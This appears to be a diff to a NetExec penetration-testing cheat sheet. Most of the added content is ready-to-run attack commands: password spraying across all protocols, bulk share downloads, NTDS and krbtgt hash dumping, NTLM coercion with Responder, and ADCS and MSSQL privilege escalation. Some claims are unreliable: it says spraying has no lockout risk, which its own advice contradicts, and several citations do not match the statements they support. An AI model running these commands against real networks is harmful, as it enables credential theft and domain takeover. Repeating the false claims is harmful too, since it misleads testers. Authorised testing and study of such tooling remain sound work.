@@ -37,6 +37,8 @@ Common protocols include:
 
 - https://www.netexec.wiki/getting-started/using-credentials#using-credentials
 
+Usually only `smb` or `winrm` are "true" admin, but the rest is usually some level of code execution at least.
+
 |Protocol|What `Pwn3d!` means|How it checks|
 |---|---|---|
 |`smb`|Local admin on the machine|Can write to `ADMIN$` / `C$`, member of local Administrators group|
@@ -55,6 +57,14 @@ Common protocols include:
 - "With the SMB protocol, your compromised users are most likely in the (local) administrators group" when Pwn3d! appears [Palo Alto Networks](https://docs-cortex.paloaltonetworks.com/r/Cortex-XDR/Cortex-XDR-Analytics-Alert-Reference-by-Alert-name/Fodhelper.exe-UAC-bypass)
 - "Code execution results in a (Pwn3d!) added after the login confirmation" — this is the universal rule across all code-execution-capable protocols [GitHub](https://github.com/CousTov/UACBypass)
 - LDAP `Pwn3d!` is fundamentally different — it doesn't mean code execution, it means **AD privilege**. A user with DCSync gets `Pwn3d!` on LDAP but might be `[+]` only on SMB
+
+## Generating Hosts File
+
+```bash
+nxc smb <TARGETS> --generate-hosts-file nxc_hosts
+sudo cp /etc/hosts /etc/hosts.bak_$(date +%Y-%m-%d_%H:%M:%S)
+cat nxc_hosts | sudo tee -a /etc/hosts
+```
 
 ## Database
 
@@ -100,6 +110,23 @@ export shares detailed shares.csv
 export local_admins detailed local_admins.csv
 ```
 
+## Password Spraying
+
+Password spraying uses one password against many users (alternates users), which has **no risk of account lockout** compared to brute-forcing. This is useful as a "hail Mary" to find any way in!
+
+**Best practice**: Obtain account lockout policy beforehand (via enumeration or asking customer); if password policy is unknown, a good rule of thumb is to wait a few hours between attempts, which should be long enough for the account lockout threshold to reset.
+
+**Spray same password against all protocols (local and domain auth)**
+```bash
+# NOTE: this misses local authentication for MSSQL "-d ."
+for proto in $(nxc -h 2>&1 | grep -oP '(?<=\{)[^}]+(?=\})' | head -1 | tr ',' ' '); do
+  for auth in "--local-auth" "-d <DOMAIN>"; do
+    echo "[*] $proto -- $auth" | tee -a nxc_spray_all_protos.txt
+    nxc $proto <TARGETS> -u <USER> -p '<PASSWORD>' $auth 2>/dev/null | grep '+' | tee -a nxc_spray_all_protos.txt
+  done
+done
+```
+
 ## SMB
 
 ### Null Session Enumeration
@@ -107,7 +134,7 @@ export local_admins detailed local_admins.csv
 Single command covers users, groups, shares, and password policy via null/anonymous session:
 
 ```bash
-nxc smb <TARGET> -u '' -p '' --users --groups --shares --pass-pol --rid-brute
+nxc smb <TARGET> -u '' -p '' --users --groups --shares --pass-pol --rid-brute 10000
 ```
 
 ### Password Policy Enumeration
@@ -162,6 +189,8 @@ nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --computers
 
 ### Shares Enumeration
 
+See [the spider_plus module for bulk downloading](#spider_plus)
+
 ```bash
 # List available shares
 nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --shares
@@ -169,34 +198,12 @@ nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --shares
 # Index all files across all shares (no download -- outputs JSON file list)
 nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" -M spider_plus
 cat /tmp/nxc_spider_plus/*.json | python3 -m json.tool
-
-# Bulk download everything (filter out noisy default shares)
-nxc smb <TARGET> -u <USER> -p <PASS> -M spider_plus \
-    -o DOWNLOAD_FLAG=True \
-       OUTPUT_FOLDER=$HOME/nxc_spider \
-       MAX_FILE_SIZE=$((1024 * 1024 * 10)) \
-       EXCLUDE_FILTER='admin$,c$,ipc$,NETLOGON,SYSVOL'
 ```
 
-#### Download single file `smblcient`
+#### Download single file `smbclient`
 
 ```bash
 smbclient //<TARGET>/<SHARE> -U '<USER>%<PASSWORD>' -c "get <FILE>"
-```
-
-### Password Spraying
-
-Password spraying uses one password against many users (alternates users), which has **no risk of account lockout** compared to brute-forcing. This is useful as a "hail Mary" to find any way in!
-
-**Best practice**: Obtain account lockout policy beforehand (via enumeration or asking customer); if password policy is unknown, a good rule of thumb is to wait a few hours between attempts, which should be long enough for the account lockout threshold to reset.
-
-```bash
-for proto in $(nxc -h 2>&1 | grep -oP '(?<=\{)[^}]+(?=\})' | head -1 | tr ',' ' '); do
-  for auth in "--local-auth" "-d <DOMAIN>"; do
-    echo "[*] $proto -- $auth" | tee -a nxc_spray_all_protos.txt
-    nxc $proto <TARGETS> -u <USER> -p '<PASSWORD>' $auth 2>/dev/null | grep '+' | tee -a nxc_spray_all_protos.txt
-  done
-done
 ```
 
 ### Pass the Hash (PtH)
@@ -258,26 +265,22 @@ nxc smb <TARGET> -u <USER> -p '<PASS>' -M procdump
 - **NOTE:** this can sometimes crash the DC:
     - https://github.com/Pennyw0rth/NetExec/discussions/329#discussioncomment-9594340
 
-```bash
-# Server 2019+: Extract NTDS.dit using ntdsutil module (copies NTDS.dit then parses it)
-nxc smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> -M ntdsutil
-```
-
-To dump **one** account instead of the full database, add `--ntds --user <USER>`:
-
+To dump **one** account instead, add `--ntds --user <USER>`:
 ```bash
 # Dump a specific user only (NTDS hash extraction scoped to one account)
 nxc smb <TARGET> -u <USER> -p <PASSWORD> --ntds --user Administrator
 nxc smb <TARGET> -u <USER> -p <PASSWORD> --ntds --user krbtgt
 ```
 
-Optional flags for password analysis:
-- `--ntds-history` — dumps password history for each account (useful for spotting reuse patterns and reporting)
-- `--ntds-pwdLastSet` — includes last password change timestamp alongside each hash (useful for staleness analysis)
-
+**Server 2019+**
 ```bash
-# Full dump with history and timestamps
-nxc smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> --ntds --ntds-history --ntds-pwdLastSet
+# Extract NTDS.dit (copies NTDS.dit then parses it)
+nxc smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> -M ntdsutil
+```
+
+**Full dump with history and timestamps**
+```bash
+nxc smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> --ntds --history --kerberos-keys
 ```
 
 #### Hash Defaults
@@ -298,8 +301,8 @@ netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --share <SHARE> --get-file <FULL_
 
 **Upload file (use full file path)**
 ```bash
-# NOTE: use '\Windows\Temp\FILE' without the drive letter
-netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --share <SHARE> --put-file '<FULL_FILE_PATH>'
+# NOTE: use '\Windows\Temp\FILE' or '\\SHARE\folder' without the drive letter
+netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --share <SHARE> --put-file <FILE> '<FULL_FILE_PATH>'
 ```
 
 ## LDAP
@@ -390,6 +393,8 @@ nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' --kerberoasting nxc_kerberoast.txt
 ```
 
 ## MSSQL
+
+**NOTE:** this [protocol has file operations --get-file and --put-file functions as well](#uploading-and-getting-files)
 
 MSSQL has 3 types of authentication: domain, local auth, and SQL account; all 3 should be tried to find valid creds.
 
@@ -640,9 +645,9 @@ nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M keepass_trigger -o ACTION=CLEAN KE
 nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M rdp -o ACTION=enable
 ```
 
-#### NTLM Coercion via Writable Share (drop-sc)
+#### `drop-sc` NTLM Coercion via Writable Share
 
-NOTE: requires write access to target share + Responder listening on tun0
+NOTE: requires write access to target share + Responder listening on `tun0`
 
 ```bash
 # Start Responder first
@@ -682,4 +687,22 @@ nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M groupmembership -o USER='<USER>'
 ```bash
 # IP and domain names
 netexec ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M get-network -o ALL=true
+```
+
+#### `adcs`
+
+Active Directory Certificate Services (ADCS) is Windows' built-in PKI that issues and manages digital certificates -- misconfigurations in certificate templates can allow domain privilege escalation (ESC1-ESC8).
+
+```bash
+netexec ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M adcs
+```
+
+### MSSQL
+
+#### Impersonation
+
+```bash
+nxc mssql <TARGET> -u <USER> -p '<PASSWORD>' -M mssql_priv -o ACTION=enum_priv
+
+nxc mssql <TARGET> -u <USER> -p '<PASSWORD>' -M mssql_priv -o ACTION=privesc
 ```
